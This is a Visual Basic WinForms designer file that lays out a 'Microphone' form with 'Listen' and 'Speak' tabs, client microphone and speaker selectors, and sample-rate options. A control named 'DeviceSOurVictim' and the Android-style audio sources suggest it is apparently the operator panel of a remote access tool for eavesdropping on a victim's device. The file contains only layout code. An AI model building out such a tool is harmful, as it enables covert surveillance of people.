<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Microphone
    Inherits System.Windows.Forms.Form
      <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub
      Private components As System.ComponentModel.IContainer
        <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Microphone))
        Me.bIN = New System.Windows.Forms.Button()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.OutHZ = New System.Windows.Forms.ComboBox()
        Me.OutBoxSource = New System.Windows.Forms.ComboBox()
        Me.b_sta = New System.Windows.Forms.Button()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.DeviceSOurVictim = New System.Windows.Forms.ComboBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.inHZ = New System.Windows.Forms.ComboBox()
        Me.InBoxSource = New System.Windows.Forms.ComboBox()
        Me.LAB_ERR = New System.Windows.Forms.Label()
        Me.TOpacity = New System.Windows.Forms.Timer(Me.components)
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.Panel1.SuspendLayout()
        Me.Panel2.SuspendLayout()
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.SuspendLayout()
           Me.bIN.BackColor = System.Drawing.Color.FromArgb(CType(CType(10, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(10, Byte), Integer))
        Me.bIN.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.bIN.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.bIN.ForeColor = System.Drawing.Color.White
        Me.bIN.Location = New System.Drawing.Point(3, 176)
        Me.bIN.Name = "bIN"
        Me.bIN.Size = New System.Drawing.Size(437, 42)
        Me.bIN.TabIndex = 1
        Me.bIN.Tag = "0"
        Me.bIN.Text = "Run"
        Me.bIN.UseVisualStyleBackColor = False
           Me.Panel1.BackColor = System.Drawing.Color.FromArgb(CType(CType(10, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(10, Byte), Integer))
        Me.Panel1.Controls.Add(Me.Label1)
        Me.Panel1.Controls.Add(Me.Label2)
        Me.Panel1.Controls.Add(Me.OutHZ)
        Me.Panel1.Controls.Add(Me.OutBoxSource)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer))
        Me.Panel1.Location = New System.Drawing.Point(3, 3)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(437, 175)
        Me.Panel1.TabIndex = 23
           Me.Label1.AutoSize = True
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(95, Byte), Integer), CType(CType(95, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(26, 48)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(140, 19)
        Me.Label1.TabIndex = 16
        Me.Label1.Text = "Client Microphone :"
           Me.Label2.AutoSize = True
        Me.Label2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(95, Byte), Integer), CType(CType(95, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.Label2.Location = New System.Drawing.Point(54, 118)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(112, 19)
        Me.Label2.TabIndex = 18
        Me.Label2.Text = "Audio Quality :"
           Me.OutHZ.BackColor = System.Drawing.Color.Black
        Me.OutHZ.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.OutHZ.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.OutHZ.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.OutHZ.FormattingEnabled = True
        Me.OutHZ.Items.AddRange(New Object() {"8000 (Hz)", "11025 (Hz)", "16000 (Hz)", "22050 (Hz)", "32000 (Hz)", "44100 (Hz)"})
        Me.OutHZ.Location = New System.Drawing.Point(172, 115)
        Me.OutHZ.Name = "OutHZ"
        Me.OutHZ.Size = New System.Drawing.Size(236, 26)
        Me.OutHZ.TabIndex = 17
           Me.OutBoxSource.BackColor = System.Drawing.Color.Black
        Me.OutBoxSource.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.OutBoxSource.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.OutBoxSource.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.OutBoxSource.FormattingEnabled = True
        Me.OutBoxSource.Items.AddRange(New Object() {"DEFAULT", "MIC", "RECOGNITION", "COMMUNICATION", "CAMCORDER"})
        Me.OutBoxSource.Location = New System.Drawing.Point(172, 48)
        Me.OutBoxSource.Name = "OutBoxSource"
        Me.OutBoxSource.Size = New System.Drawing.Size(236, 26)
        Me.OutBoxSource.TabIndex = 15
           Me.b_sta.BackColor = System.Drawing.Color.FromArgb(CType(CType(10, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(10, Byte), Integer))
        Me.b_sta.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.b_sta.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.b_sta.ForeColor = System.Drawing.Color.FromArgb(CType(CType(95, Byte), Integer), CType(CType(95, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.b_sta.Location = New System.Drawing.Point(3, 178)
        Me.b_sta.Name = "b_sta"
        Me.b_sta.Size = New System.Drawing.Size(437, 40)
        Me.b_sta.TabIndex = 14
        Me.b_sta.Tag = "2"
        Me.b_sta.Text = "Stop"
        Me.b_sta.UseVisualStyleBackColor = False
           Me.Panel2.BackColor = System.Drawing.Color.FromArgb(CType(CType(10, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(10, Byte), Integer))
        Me.Panel2.Controls.Add(Me.Label5)
        Me.Panel2.Controls.Add(Me.Label4)
        Me.Panel2.Controls.Add(Me.DeviceSOurVictim)
        Me.Panel2.Controls.Add(Me.Label3)
        Me.Panel2.Controls.Add(Me.inHZ)
        Me.Panel2.Controls.Add(Me.InBoxSource)
        Me.Panel2.Controls.Add(Me.LAB_ERR)
        Me.Panel2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer))
        Me.Panel2.Location = New System.Drawing.Point(3, 3)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(437, 215)
        Me.Panel2.TabIndex = 24
           Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label5.ForeColor = System.Drawing.Color.FromArgb(CType(CType(95, Byte), Integer), CType(CType(95, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.Label5.Location = New System.Drawing.Point(58, 36)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(118, 19)
        Me.Label5.TabIndex = 27
        Me.Label5.Text = "PC Microphone :"
           Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(95, Byte), Integer), CType(CType(95, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.Label4.Location = New System.Drawing.Point(58, 87)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(115, 19)
        Me.Label4.TabIndex = 26
        Me.Label4.Text = "Client Speaker :"
           Me.DeviceSOurVictim.BackColor = System.Drawing.Color.Black
        Me.DeviceSOurVictim.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.DeviceSOurVictim.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.DeviceSOurVictim.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Bold)
        Me.DeviceSOurVictim.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.DeviceSOurVictim.FormattingEnabled = True
        Me.DeviceSOurVictim.Items.AddRange(New Object() {"CALL", "MUSIC"})
        Me.DeviceSOurVictim.Location = New System.Drawing.Point(234, 87)
        Me.DeviceSOurVictim.Name = "DeviceSOurVictim"
        Me.DeviceSOurVictim.Size = New System.Drawing.Size(176, 24)
        Me.DeviceSOurVictim.TabIndex = 23
           Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.Label3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(95, Byte), Integer), CType(CType(95, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.Label3.Location = New System.Drawing.Point(61, 137)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(112, 19)
        Me.Label3.TabIndex = 18
        Me.Label3.Text = "Audio Quality :"
           Me.inHZ.BackColor = System.Drawing.Color.Black
        Me.inHZ.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.inHZ.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.inHZ.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Bold)
        Me.inHZ.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.inHZ.FormattingEnabled = True
        Me.inHZ.Items.AddRange(New Object() {"8000 (Hz)", "11025 (Hz)", "16000 (Hz)", "22050 (Hz)", "32000 (Hz)", "44100 (Hz)"})
        Me.inHZ.Location = New System.Drawing.Point(234, 137)
        Me.inHZ.Name = "inHZ"
        Me.inHZ.Size = New System.Drawing.Size(176, 24)
        Me.inHZ.TabIndex = 17
           Me.InBoxSource.BackColor = System.Drawing.Color.Black
        Me.InBoxSource.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.InBoxSource.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.InBoxSource.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Bold)
        Me.InBoxSource.ForeColor = System.Drawing.Color.FromArgb(CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer), CType(CType(190, Byte), Integer))
        Me.InBoxSource.FormattingEnabled = True
        Me.InBoxSource.Location = New System.Drawing.Point(234, 36)
        Me.InBoxSource.Name = "InBoxSource"
        Me.InBoxSource.Size = New System.Drawing.Size(176, 24)
        Me.InBoxSource.TabIndex = 15
           Me.LAB_ERR.AutoSize = True
        Me.LAB_ERR.Location = New System.Drawing.Point(398, 43)
        Me.LAB_ERR.Name = "LAB_ERR"
        Me.LAB_ERR.Size = New System.Drawing.Size(21, 19)
        Me.LAB_ERR.TabIndex = 25
        Me.LAB_ERR.Text = "..."
        Me.LAB_ERR.Visible = False
           Me.TOpacity.Interval = 1
           Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControl1.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold)
        Me.TabControl1.ImageList = Me.ImageList1
        Me.TabControl1.ItemSize = New System.Drawing.Size(223, 32)
        Me.TabControl1.Location = New System.Drawing.Point(0, 0)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(451, 261)
        Me.TabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.TabControl1.TabIndex = 19
           Me.TabPage1.BackColor = System.Drawing.Color.Black
        Me.TabPage1.Controls.Add(Me.Panel1)
        Me.TabPage1.Controls.Add(Me.b_sta)
        Me.TabPage1.ImageKey = "headphones-removebg-preview.png"
        Me.TabPage1.Location = New System.Drawing.Point(4, 36)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(443, 221)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Listen"
           Me.TabPage2.Controls.Add(Me.bIN)
        Me.TabPage2.Controls.Add(Me.Panel2)
        Me.TabPage2.ImageKey = "microphone.png"
        Me.TabPage2.Location = New System.Drawing.Point(4, 36)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(443, 221)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Speak"
        Me.TabPage2.UseVisualStyleBackColor = True
           Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "headphones-removebg-preview.png")
        Me.ImageList1.Images.SetKeyName(1, "microphone.png")
           Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(451, 261)
        Me.Controls.Add(Me.TabControl1)
        Me.ForeColor = System.Drawing.Color.FromArgb(CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer), CType(CType(240, Byte), Integer))
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.MaximizeBox = False
        Me.Name = "Microphone"
        Me.Opacity = 0R
        Me.Text = "Microphone"
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        Me.Panel2.ResumeLayout(False)
        Me.Panel2.PerformLayout()
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage2.ResumeLayout(False)
        Me.ResumeLayout(False)
     End Sub
    Friend WithEvents bIN As Button
    Friend WithEvents Panel1 As Panel
    Friend WithEvents Label2 As Label
    Friend WithEvents OutHZ As ComboBox
    Friend WithEvents Label1 As Label
    Friend WithEvents OutBoxSource As ComboBox
    Friend WithEvents b_sta As Button
    Friend WithEvents Panel2 As Panel
    Friend WithEvents DeviceSOurVictim As ComboBox
    Friend WithEvents Label3 As Label
    Friend WithEvents inHZ As ComboBox
    Friend WithEvents InBoxSource As ComboBox
    Friend WithEvents TOpacity As Timer
    Friend WithEvents LAB_ERR As Label
    Friend WithEvents TabControl1 As TabControl
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents ImageList1 As ImageList
    Friend WithEvents Label5 As Label
    Friend WithEvents Label4 As Label
End Class
